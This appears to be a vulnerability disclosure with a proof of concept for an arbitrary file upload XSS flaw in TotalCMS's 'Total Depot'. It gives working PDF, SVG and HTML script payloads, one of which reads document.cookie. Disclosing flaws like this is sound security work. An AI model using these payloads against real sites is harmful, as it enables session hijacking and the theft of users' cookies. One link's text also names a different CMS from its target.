# TotalCMS Arbitrary File Upload - XSS and steal cookies

## Author: (Sergio)

**Description:** TotalCMS is affected by Arbitrary File Upload - XSS vulnerability which allows Cross-Site Scriting (XSS) and also stealing session cookies

**Attack Vectors:** A vulnerability in "Total Depot" file upload sanitation allows you to upload a PDF / SVG /HTML file with hidden alert Cross-Site scripting (XSS) and steal the user cookies.

---

### POC XSS - PDF/ SVG/ HTML:


When logging into the admin panel (https://www.totalcms.co/demo/total-cms/admin/), we will go to the "Total Depot" off the Administration Site and we upload the PDF/ SVG/ and HTML files with the hidden XSS.

There is the payloads:

### XSS PDF Payload:

It is an XSS payload generated with the JS2PDFInjector tool and a js payload that contains the following content:

```js
app.alert("XSS");
```

### SVG Payload:

```js
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert(document.location);
   </script>
</svg>
```

### HTML Payload:

```js
<html>
	<script>
		alert(document.cookie);
	</script>
</html>
```


![image](https://github.com/sromanhu/TotalCMS-Arbitrary_File-Upload--XSS_Steal_Cookies---TotalDepot/assets/87250597/59567372-3336-4efd-aa24-2293ee2018c3)



![image](https://github.com/sromanhu/TotalCMS-Arbitrary_File-Upload--XSS_Steal_Cookies---TotalDepot/assets/87250597/bfbddc70-9021-4fdb-9ed5-63eed29f25ce)





</br>

### Additional Information:
[http://www.cmsmadesimple.org/](https://www.totalcms.co/)

https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
